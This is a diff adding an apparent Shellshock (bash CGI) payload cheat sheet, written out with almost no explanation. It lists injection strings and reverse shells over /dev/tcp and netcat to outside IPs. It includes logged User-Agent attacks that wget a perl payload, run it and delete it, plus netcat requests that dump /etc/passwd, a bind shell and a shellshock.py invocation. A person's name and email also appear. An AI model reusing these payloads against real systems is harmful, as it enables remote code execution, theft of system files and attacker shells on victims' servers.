@@ -1,0 +1,59 @@
+1.- { :;}; /bin/ls
+
+2.- { :;}; /bin/ping -c 1 10.0.0.1
+
+3.- "() { :;}; /bin/bash -c \"wget --delete-after http://remika.ru/userfiles/file/test.php\"
+
+4.-  "() { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/195.225.34.101/3333 0>&1'"
+
+5.- env x='() { :;}; echo vulnerable' bash -c "echo this is a test"  
+
+IP Address: 74.201.85.67
+Location: Atlanta, GA 30303
+
+http://target.tld:80/cgi-bin/test.sh
+http://target.tld:80/cgi-bin/info.sh
+http://target.tld:80/cgi-bin/test.sh
+http://target.tld:80/cgi-bin/php.fcgi
+http://target.tld:80/cgi-bin/php
+
+User Agent: () { :;}; /bin/bash -c "wget -O /var/tmp/wow1 208.118.61.44/wow1;perl 
+
+/var/tmp/wow1;rm -rf /var/tmp/wow1"
+User Agent: () { :;}; /bin/bash -c "wget -O /var/tmp/wow1 208.118.61.44/wow1;perl
+
+ /var/tmp/wow1;rm -rf /var/tmp/wow1"
+User Agent: () { :;}; /bin/bash -c "wget -O /var/tmp/wow1 208.118.61.44/wow1;perl 
+
+/var/tmp/wow1;rm -rf /var/tmp/wow1"
+User Agent: () { :;}; /bin/bash -c "wget -O /var/tmp/wow1 208.118.61.44/wow1;perl 
+
+/var/tmp/wow1;rm -rf /var/tmp/wow1"
+User Agent: () { :;}; /bin/bash -c "wget -O /var/tmp/wow1 208.118.61.44/wow1;perl 
+
+/var/tmp/wow1;rm -rf /var/tmp/wow1"
+
+Timestamp: 9/26/2014 8:39:45 AM
+
+Kennedy Sanchez <ksanchez@cldeveloper.com>
+
+-> ./shellshock.py payload=reverse rhost=10.0.0.9 lhost=10.0.0.8 lport=1234
+
+
+# echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection:close\r\n\r\n" | nc 10.0.0.9 80
+
+[Bind Shell]
+
+# echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 10.0.0.9 80
+
+[Reverse Shell]
+# echo "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection:close\r\n\r\n" | nc 10.0.0.9 80
+
+curl –H 'x: () { :;}; /bin/bash –I >& /dev/tcp/192.168.1.102 0>&1'
+
+
+
+
+http://dev4sec.blogspot.com/search?q=shellshock
+https://www.youtube.com/watch?v=U0HtR92phQY
+https://www.youtube.com/channel/UCYXR6jyFsPyK0IW9d13U8bQ
